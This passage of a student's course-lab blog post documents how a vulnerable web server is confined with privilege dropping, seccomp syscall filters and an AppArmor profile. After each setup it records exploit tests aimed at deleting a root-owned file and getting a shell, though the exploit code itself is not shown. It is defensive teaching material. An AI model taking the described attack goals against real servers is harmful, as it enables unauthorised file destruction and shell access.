+<p>Perform file deletion test, found that the <code>/tmp/test.txt</code>
+file still exists and was not deleted.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153901043.png"
+alt="image-20240619153901043" />
+<figcaption aria-hidden="true">image-20240619153901043</figcaption>
+</figure>
+<p>We can try to modify the owner of this file to myself and see if it
+can be deleted.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Modify <span class="built_in">test</span> file owner</span></span><br><span class="line">sudo chown lixiang:root /tmp/test.txt</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619154643560.png"
+alt="image-20240619154643560" />
+<figcaption aria-hidden="true">image-20240619154643560</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619161636645.png"
+alt="image-20240619161636645" />
+<figcaption aria-hidden="true">image-20240619161636645</figcaption>
+</figure>
+<h3 id="defense-result-analysis-1">Defense Result Analysis</h3>
+<p>This defense mainly prevents malicious operations as high-privilege
+users by reducing the privileges of the 3 child processes started by the
+server. From the above results, we can also find that after actively
+giving up root privileges, files owned by root cannot be deleted, but
+when the file owner is changed to lixiang (ordinary user), the test file
+can be deleted normally. We also found a phenomenon that even if the
+file’s user group is root, it can still be deleted, indicating that when
+deleting files, it has nothing to do with the user group, but is related
+to the file owner.</p>
+<h2
+id="use-seccomp-to-constrain-web-servers-vulnerable-process-test-exploit">Use
+seccomp to constrain web server’s vulnerable process, test exploit</h2>
+<h3 id="experiment-environment-configuration-3">Experiment Environment
+Configuration</h3>
+<p>Similarly copy the code to create a new code_seccomp</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_seccomp</span><br></pre></td></tr></table></figure>
+<p>Can use the following commands to check if the kernel has enabled
+seccomp:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp support is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP= /boot/config-$(uname -r) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp filter is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP_FILTER= /boot/config-$(uname -r) </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619164635614.png"
+alt="image-20240619164635614" />
+<figcaption aria-hidden="true">image-20240619164635614</figcaption>
+</figure>
+<p>If the output is: <code>CONFIG_SECCOMP=y</code> and
+<code>CONFIG_SECCOMP_FILTER=y</code>, it means the kernel has enabled
+seccomp. To check if a specific process has enabled seccomp, use the
+following command:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&lt;pid&gt;/status | grep Seccomp</span><br></pre></td></tr></table></figure>
+<p>Where <pid> represents the process PID, can use <code>ps -au</code>
+to view. If the output contains a Seccomp field, it means the process
+uses seccomp. If there’s no such field, it means the process doesn’t use
+seccomp.</p>
+<p>Modify the makefile file, add <code>-lseccomp</code> to the
+compilation options for banksv</p>
+<figure>
+<img
+src="https://picx.zhimg.com/80/v2-6adab4a46975fe018a720b338dd9ecf5_720w.png"
+alt="image-20240619170121404" />
+<figcaption aria-hidden="true">image-20240619170121404</figcaption>
+</figure>
+<p>Found that an additional libseccomp.so.2 library was added, so the
+base address of libc.so.6 changed, just modify it in the script.</p>
+<figure>
+<img
+src="https://pic1.zhimg.com/80/v2-0b7bc536cb3bbe375efa7e95c045f93d_720w.png"
+alt="image-20240619173424478" />
+<figcaption aria-hidden="true">image-20240619173424478</figcaption>
+</figure>
+<h3 id="perform-seccomp-coding">Perform seccomp coding</h3>
+<h4 id="default-allow-explicit-deny">Default allow, explicit deny</h4>
+<p>Modify banksv.c, add the following code, initialize with default
+allow rules, and add rules to deny unlink, then load seccomp.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619165715018.png"
+alt="image-20240619165715018" />
+<figcaption aria-hidden="true">image-20240619165715018</figcaption>
+</figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_seccomp</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="type">int</span> ret;  </span><br><span class="line">    scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLOW);  </span><br><span class="line">    <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">    …  </span><br><span class="line">    <span class="built_in">init_seccomp</span>();  </span><br><span class="line">    …  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<p>Compile and run server</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure>
+<h4 id="default-deny-explicit-allow">Default deny, explicit allow</h4>
+<p>Modify banksv.c, add the following code, deny all rules by default,
+and add allowed rules, then load seccomp.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172906034.png"
+alt="image-20240619172906034" />
+<figcaption aria-hidden="true">image-20240619172906034</figcaption>
+</figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_deny_bydefault_rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> ret;  </span><br><span class="line">  scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_KILL);  </span><br><span class="line">  <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">      </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(read), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(write), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(openat), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(rt_sigaction), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(socketcall), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(clone), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(set_robust_list), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getresuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getcwd), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getpid), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(statx), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(close), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(_llseek), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fcntl64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(access), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(brk), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(exit_group), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchmod), <span class="number">0</span>); </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(stat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fstat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(geteuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchown32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fsync), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Permissions needed by attack program</span></span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(system), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">  <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Compile and run server</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure>
+<h3 id="perform-exploit-test-2">Perform exploit test</h3>
+<h4 id="default-allow-explicit-deny-1">Default allow, explicit deny</h4>
+<p>First create test files</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure>
+<p>Both file deletion and shell acquisition failed, and there will also
+be system error report popups. The specific results are as shown below,
+with two audit logs appearing in the dmesg kernel messages.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172118447.png"
+alt="image-20240619172118447" />
+<figcaption aria-hidden="true">image-20240619172118447</figcaption>
+</figure>
+<p>This approach will bring negative effects, such as inability to
+register and connection reset.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619171801241.png"
+alt="image-20240619171801241" />
+<figcaption aria-hidden="true">image-20240619171801241</figcaption>
+</figure>
+<h4 id="default-deny-explicit-allow-1">Default deny, explicit allow</h4>
+<p>First create test files</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure>
+<p>Both file deletion and shell acquisition failed, results as shown
+below:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621133745249.png"
+alt="image-20240621133745249" />
+<figcaption aria-hidden="true">image-20240621133745249</figcaption>
+</figure>
+<p>With the help of AI, the meaning of the audit logs is as follows</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621134819072.png"
+alt="image-20240621134819072" />
+<figcaption aria-hidden="true">image-20240621134819072</figcaption>
+</figure>
+<p>But I feel this is more troublesome, must determine which system
+calls need to be used, personally think it’s not as good as the previous
+one.</p>
+<h3 id="defense-result-analysis-2">Defense Result Analysis</h3>
+<p>seccomp (full name secure computing mode) is a sandbox security
+mechanism. In Linux systems, a large number of system calls are directly
+exposed to user-space programs. However, not all system calls are
+needed, and unsafe code abusing system calls can pose security threats
+to the system. Through seccomp, <strong>restrict programs from using
+certain system calls</strong>, which can reduce the system’s attack
+surface and put programs into a “secure” state, similar to a
+<strong>firewall for system calls</strong>.</p>
+<h2
+id="use-apparmor-to-constrain-web-servers-vulnerable-process-test-exploit">Use
+AppArmor to constrain web server’s vulnerable process, test exploit</h2>
+<h3 id="experiment-environment-configuration-4">Experiment Environment
+Configuration</h3>
+<p>Use cp to create a new code directory code_apparmor, then need to
+start apparmor and install related tools.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_apparmor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Install AppArmor and related tools</span> </span><br><span class="line">sudo systemctl start apparmor</span><br><span class="line">sudo apt install apparmor-profiles apparmor-utils </span><br></pre></td></tr></table></figure>
+<h3 id="apply-apparmor">Apply AppArmor</h3>
+<p>After the server starts running, use aa-genprof to generate
+configuration file for banksv in the directory:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone </span><br><span class="line"></span><br><span class="line">sudo aa-genprof banksv</span><br></pre></td></tr></table></figure>
+<p>Press F to skip, and combine aa-logprof with manually adding rules to
+improve the configuration file. The configuration file path is
+<code>/etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</code>.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619184538978.png"
+alt="image-20240619184538978" />
+<figcaption aria-hidden="true">image-20240619184538978</figcaption>
+</figure>
+<p>Open the configuration file and write the following content:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619185627994.png"
+alt="image-20240619185627994" />
+<figcaption aria-hidden="true">image-20240619185627994</figcaption>
+</figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Wed Jun 19 03:45:02 2024</span><br><span class="line">#include &lt;tunables/global&gt;</span><br><span class="line"></span><br><span class="line">/home/lixiang/Desktop/lab2/code_apparmor/banksv &#123;</span><br><span class="line"></span><br><span class="line">  # Include apache2-common and base abstractions, these abstractions contain some common permission settings.</span><br><span class="line">  include &lt;abstractions/apache2-common&gt;  </span><br><span class="line">  include &lt;abstractions/base&gt;  </span><br><span class="line">  </span><br><span class="line">  # Deny read/write operations on any files in /tmp directory  </span><br><span class="line">  deny /tmp/** mrwx,  </span><br><span class="line"></span><br><span class="line">  # Allow read-only access to all files in code_task5 directory</span><br><span class="line">  /home/lixiang/Desktop/lab2/code_apparmor/** mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Reload the configuration file to make the above configuration file
+effective:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apparmor_parser -r /etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</span><br></pre></td></tr></table></figure>
+<h3 id="perform-exploit-test-3">Perform exploit test</h3>
+<p>First create test files</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure>
+<p>File deletion failed:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190107460.png"
+alt="image-20240619190107460" />
+<figcaption aria-hidden="true">image-20240619190107460</figcaption>
+</figure>
+<p>Shell acquisition failed:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190000149.png"
+alt="image-20240619190000149" />
+<figcaption aria-hidden="true">image-20240619190000149</figcaption>
+</figure>
+<p>Use dmesg to view kernel output logs, found two deny rules, exactly
+shell execution and unlink:</p>
+<figure>
+<img
+src="https://pic1.zhimg.com/80/v2-942e24274ddd70aa2ded5bd3200b36f7_720w.png"
+alt="image-20240619191557469" />
+<figcaption aria-hidden="true">image-20240619191557469</figcaption>
+</figure>
+<h3 id="problems-encountered-1">Problems Encountered</h3>
+<p>Once defining deny for /tmp folder in the configuration file, using
+dmesg cannot see the unlink denied message, but not defining it can see
+it, which feels very strange. Another possibility is that the included
+configuration files themselves contain the most basic access control,
+including unlink, but file path restrictions will directly cause a
+problem which is <strong>access interception</strong>, <strong>file
+access requests are completely intercepted at the file system level,
+programs may not have the opportunity to try <code>unlink</code>
+operations</strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Deny read/write operations on any files in /tmp directory  </span><br><span class="line">deny /tmp/** mrwx,  </span><br></pre></td></tr></table></figure>
+<h3 id="defense-result-analysis-3">Defense Result Analysis</h3>
+<p>AppArmor (Application Armor) is a Linux kernel security module used
+to limit program capabilities, allowing system administrators to define
+what resources each program can access. AppArmor uses a path-based
+access control mechanism, defining program security policies through
+configuration files.</p>
+<p>Main features of AppArmor:</p>
+<ol type="1">
+<li><strong>Path-based access control</strong>:
+<ul>
+<li>Use file system paths to define access control rules.</li>
+<li>Configuration files specify which files, directories and resources
+programs can access.</li>
+</ul></li>
+<li><strong>Configuration files</strong>:
+<ul>
+<li>Each protected program has a corresponding configuration file,
+usually located in the <code>/etc/apparmor.d/</code> directory.</li>
+<li>Configuration files define program permissions, including file
+access, network access, capabilities, etc.</li>
+</ul></li>
+<li><strong>Two modes</strong>:
+<ul>
+<li><strong>Enforcing mode</strong>: Strictly enforce rules in
+configuration files, any behavior violating rules will be blocked and
+logged.</li>
+<li><strong>Complain mode</strong>: Log behavior violating rules, but
+don’t block operations. This mode is commonly used for debugging and
+configuring rules.</li>
+</ul></li>
+<li><strong>Integrated into Linux kernel</strong>:
+<ul>
+<li>As part of Linux Security Modules (LSM), directly implemented in the
+kernel, providing efficient security control.</li>
+</ul></li>
+<li><strong>Flexibility</strong>:
+<ul>
+<li>Support different abstraction files (such as
+<code>&lt;abstractions/base&gt;</code> and
+<code>&lt;abstractions/apache2-common&gt;</code>), used to simplify
+configuration of common permissions.</li>
+</ul></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io">Xiang Li</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/">https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Course-Experiments/">Course Experiments</a></div><div class="post-share"><div class="social-share" data-image="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/" title="HUST Information System Security Lab3-Web Security"><img class="cover" src="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">HUST Information System Security Lab3-Web Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab3</div></div></div></a><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/" title="HUST Information System Security Lab1-Software Security"><img class="cover" src="https://t3.chei.com.cn/zyk/zybk/zyjd/cdn/showImg/ikb2ll7ejr4ufkfj.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HUST Information System Security Lab1-Software Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab1</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/" title="HUST Information System Security Lab1-Software Security"><img class="cover" src="https://t3.chei.com.cn/zyk/zybk/zyjd/cdn/showImg/ikb2ll7ejr4ufkfj.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab1-Software Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab1</div></div></div></a><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/" title="HUST Information System Security Lab3-Web Security"><img class="cover" src="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab3-Web Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab3</div></div></div></a><a class="pagination-related" href="/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/" title="HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/v2osk-1Z2niiBPg5A-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="info-item-2">HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab2</div></div></div></a><a class="pagination-related" href="/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/" title="HUST Operating System Lab3: Memory Management"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/david-marcu-78A265wPiO4-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="info-item-2">HUST Operating System Lab3: Memory Management</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab3</div></div></div></a><a class="pagination-related" href="/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/" title="11711 Advanced NLP: Architectures"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-29</div><div class="info-item-2">11711 Advanced NLP: Architectures</div></div><div class="info-2"><div class="info-item-1">Notes on RNN architectures, encoder-decoder models, and attention mechanisms from CMU 11-711 Advanced NLP.</div></div></div></a><a class="pagination-related" href="/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/" title="11711 Advanced NLP: Fundamentals"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">11711 Advanced NLP: Fundamentals</div></div><div class="info-2"><div class="info-item-1">Notes and summaries for CMU 11-711 Advanced NLP.</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" 